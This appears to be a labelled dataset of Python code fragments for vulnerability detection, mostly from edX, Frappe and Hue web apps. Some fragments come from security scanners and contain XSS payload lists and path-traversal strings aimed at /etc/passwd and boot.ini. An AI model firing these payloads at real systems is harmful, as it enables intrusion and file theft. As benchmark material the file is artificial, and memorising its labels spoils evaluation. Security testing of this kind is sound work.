\tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tcmd=\"cat %s| awk", "label": 0}, {"snippet_id": 7095, "code": "'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'", "label": 0}, {"snippet_id": 43167, "code": "\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint'", "label": 0}, {"snippet_id": 47373, "code": "(\"user_id\"): user_id=int(http_request.GET[\"user_id\"]) if user_id is not None: profile=Profile.objects.get(pk=user_id) f=Form() f.action_url=action_url if profile: f.add_content(PlainText('<h3>Edit user", "label": 0}, {"snippet_id": 38266, "code": "=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content", "label": 0}, {"snippet_id": 46414, "code": ", uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection", "label": 0}, {"snippet_id": 51903, "code": "'pickle'] CELERY_TASK_SERIALIZER='pickle' CELERY_RESULT_SERIALIZER='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER='django_celery_beat.schedulers:DatabaseScheduler' CELERY_BROKER_CONNECTION_MAX_RETRIES", "label": 0}, {"snippet_id": 6422, "code": ") @property def server_key(self): \"\"\" SSL private key filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_key') @property def cert_chain(self): \"\"\" SSL certificate chain filename", "label": 0}, {"snippet_id": 53434, "code": " bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name", "label": 0}, {"snippet_id": 49611, "code": ".ordering_query_param=ordering_query_param self.columns=self.get_columns() self.filters=[ SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1) ]", "label": 0}, {"snippet_id": 8329, "code": "/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload", "label": 0}, {"snippet_id": 18936, "code": ".MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=", "label": 0}, {"snippet_id": 33745, "code": "\tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title", "label": 1}, {"snippet_id": 40432, "code": "\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision", "label": 0}, {"snippet_id": 54151, "code": "=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main, text=\"Cookie", "label": 0}, {"snippet_id": 233, "code": ": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found", "label": 0}, {"snippet_id": 45224, "code": ").id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission", "label": 0}, {"snippet_id": 14298, "code": "=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 19947, "code": "(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly", "label": 0}, {"snippet_id": 44904, "code": "\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']", "label": 0}, {"snippet_id": 2157, "code": ") if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid", "label": 0}, {"snippet_id": 37278, "code": ".blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"", "label": 0}, {"snippet_id": 30242, "code": "('stats_page') \t \tpostdata={ \t\t'action': form.getvalue('action'), \t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101", "label": 0}, {"snippet_id": 15309, "code": "('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly", "label": 0}, {"snippet_id": 48888, "code": " None: del query[key] return '?{}'.format(urlencode(query)) class SmartListField(object): def __init__(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self.column=column self", "label": 0}, {"snippet_id": 15066, "code": " expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler(''", "label": 0}, {"snippet_id": 41772, "code": " \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value)", "label": 0}, {"snippet_id": 42642, "code": "): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get", "label": 0}, {"snippet_id": 45824, "code": " in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt", "label": 0}, {"snippet_id": 19258, "code": "', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 18449, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views", "label": 0}, {"snippet_id": 1503, "code": "/Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST'])", "label": 0}, {"snippet_id": 1634, "code": "({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps", "label": 0}, {"snippet_id": 26464, "code": "./../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f", "label": 0}, {"snippet_id": 48616, "code": " +str(int(request.GET[\"rid\"])) +\"&srid=\" +str(sr.id)) if \"rid\" in request.GET: r=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects", "label": 0}, {"snippet_id": 12353, "code": "/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard", "label": 0}, {"snippet_id": 36496, "code": "\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not", "label": 0}, {"snippet_id": 17038, "code": "[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 11416, "code": ".imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir)", "label": 0}, {"snippet_id": 36008, "code": "\t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 17756, "code": ", url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django", "label": 0}, {"snippet_id": 41149, "code": ".category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t", "label": 0}, {"snippet_id": 3498, "code": ",body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs", "label": 0}, {"snippet_id": 55156, "code": "{ 'count': 0, 'invalid_translation_count': invalid_translation_count, }) update_stats(action_status['translated_resources'], locale) mark_changed_translation(action_status['changed_entities'], locale) if", "label": 0}, {"snippet_id": 35661, "code": ",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 40773, "code": " \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get", "label": 0}, {"snippet_id": 12997, "code": "*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500'", "label": 0}, {"snippet_id": 19467, "code": "-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual", "label": 0}, {"snippet_id": 36012, "code": ".ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 14339, "code": "', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid", "label": 0}, {"snippet_id": 32042, "code": " import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\"", "label": 0}, {"snippet_id": 1530, "code": ".get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid", "label": 0}, {"snippet_id": 23520, "code": "'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 22063, "code": " urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if", "label": 0}, {"snippet_id": 39902, "code": " cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df", "label": 0}, {"snippet_id": 18120, "code": "/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views", "label": 0}, {"snippet_id": 2355, "code": " else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid", "label": 0}, {"snippet_id": 29604, "code": "\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t", "label": 0}, {"snippet_id": 47648, "code": ">')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password(leave blank in order to not change it):')) else", "label": 0}, {"snippet_id": 2851, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None", "label": 0}, {"snippet_id": 45133, "code": "): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie", "label": 0}, {"snippet_id": 11660, "code": "'auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+", "label": 0}, {"snippet_id": 22979, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)", "label": 0}, {"snippet_id": 6159, "code": ", _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property", "label": 0}, {"snippet_id": 46164, "code": "') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name=collections[0], engine=engine) query={'qs':[", "label": 0}, {"snippet_id": 11600, "code": " name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account')", "label": 0}, {"snippet_id": 34343, "code": ", value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict)", "label": 0}, {"snippet_id": 36743, "code": "\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags", "label": 0}, {"snippet_id": 25384, "code": "(rendered_widgets) class NamePartsFormField(forms.MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data", "label": 0}, {"snippet_id": 31882, "code": "\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t \t\telse: \t\t\tprint('<div class=\"alert alert-success\" style=", "label": 0}, {"snippet_id": 45757, "code": ": request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']", "label": 0}, {"snippet_id": 29618, "code": ").decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div", "label": 0}, {"snippet_id": 13338, "code": " url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render'", "label": 0}, {"snippet_id": 51861, "code": "'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', }, } }, 'loggers':{ 'django':{ 'handlers':['console'], 'level':", "label": 0}, {"snippet_id": 49712, "code": "'label']=None, field, label else: kwargs['field'], kwargs['label']=field, label columns.append(SmartColumn(**kwargs)) return columns @property def items(self): return[ SmartListItem(self, obj) for obj in", "label": 0}, {"snippet_id": 34721, "code": " and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table'", "label": 0}, {"snippet_id": 16783, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 39224, "code": "=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields:", "label": 0}, {"snippet_id": 32446, "code": " Args: value: The name of a section that is to be converted. _separator: Unused. This is actually a configurable string that is used as a replacement character for spaces in the title, typically set to ", "label": 0}, {"snippet_id": 34744, "code": "(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname", "label": 0}, {"snippet_id": 26454, "code": "<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../", "label": 0}, {"snippet_id": 41624, "code": ". \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module", "label": 0}, {"snippet_id": 23320, "code": "\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location", "label": 0}, {"snippet_id": 7326, "code": ".views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if", "label": 0}, {"snippet_id": 50746, "code": "(bool): No parsing at all(leave ansi-to-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt(bool): Send a prompt with parsed html \"\"\" if args", "label": 0}, {"snippet_id": 16296, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^", "label": 0}, {"snippet_id": 39447, "code": "+[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t", "label": 0}, {"snippet_id": 12236, "code": "[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses", "label": 1}, {"snippet_id": 11843, "code": " name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name", "label": 0}, {"snippet_id": 18163, "code": "/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg", "label": 0}, {"snippet_id": 1632, "code": " records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try", "label": 0}, {"snippet_id": 3275, "code": ".W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\":", "label": 0}, {"snippet_id": 5749, "code": "<button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'", "label": 0}, {"snippet_id": 37869, "code": ".db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self", "label": 0}, {"snippet_id": 23620, "code": "'ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if", "label": 0}, {"snippet_id": 5817, "code": " \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url:", "label": 0}, {"snippet_id": 48995, "code": ": if not hasattr(self.object, 'get_absolute_url'): raise SmartListException(\"Please make sure your model{} implements get_absolute_url()\".format(type(self.object))) return format_html( '<td><a href=\"{}", "label": 0}, {"snippet_id": 27231, "code": " print \"[-] scan_for_forms(): Error \" +str(e) return def banner(): print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2", "label": 1}, {"snippet_id": 9978, "code": " pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib", "label": 0}, {"snippet_id": 15835, "code": ".get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir", "label": 0}, {"snippet_id": 26697, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 30568, "code": "%s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s", "label": 0}, {"snippet_id": 634, "code": "/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)", "label": 1}, {"snippet_id": 25025, "code": ".start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course", "label": 0}, {"snippet_id": 10130, "code": "/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec", "label": 0}, {"snippet_id": 34460, "code": " key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key)", "label": 0}, {"snippet_id": 47832, "code": "[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations", "label": 1}, {"snippet_id": 48927, "code": ".field_name) if self.column.field_name else None if type(self.object)==dict: value=self.object.get(self.column.field_name) elif callable(field): value=field() if getattr(field, 'do_not_call_in_templates', False", "label": 1}, {"snippet_id": 48391, "code": ")) not in request.POST or str(\"notes_\" +str(art.id)) not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art", "label": 0}, {"snippet_id": 50515, "code": " return '\"\"' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in from the ajax client. The requests should be tagged with different modes depending on what", "label": 0}, {"snippet_id": 3038, "code": " import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list", "label": 0}, {"snippet_id": 35357, "code": ", docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname", "label": 0}, {"snippet_id": 43049, "code": "\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t", "label": 0}, {"snippet_id": 3834, "code": " result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}", "label": 0}, {"snippet_id": 53750, "code": " destination of the generated eb config', default='./.elasticbeanstalk/config.yml') parser.add_argument('--name', type=str, required=True, help='The name of the application') parser.add_argument('--region", "label": 0}, {"snippet_id": 39039, "code": " isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t", "label": 0}, {"snippet_id": 52565, "code": "' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try", "label": 0}, {"snippet_id": 5148, "code": " %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror", "label": 0}, {"snippet_id": 42710, "code": " table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent", "label": 0}, {"snippet_id": 23967, "code": "-xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', 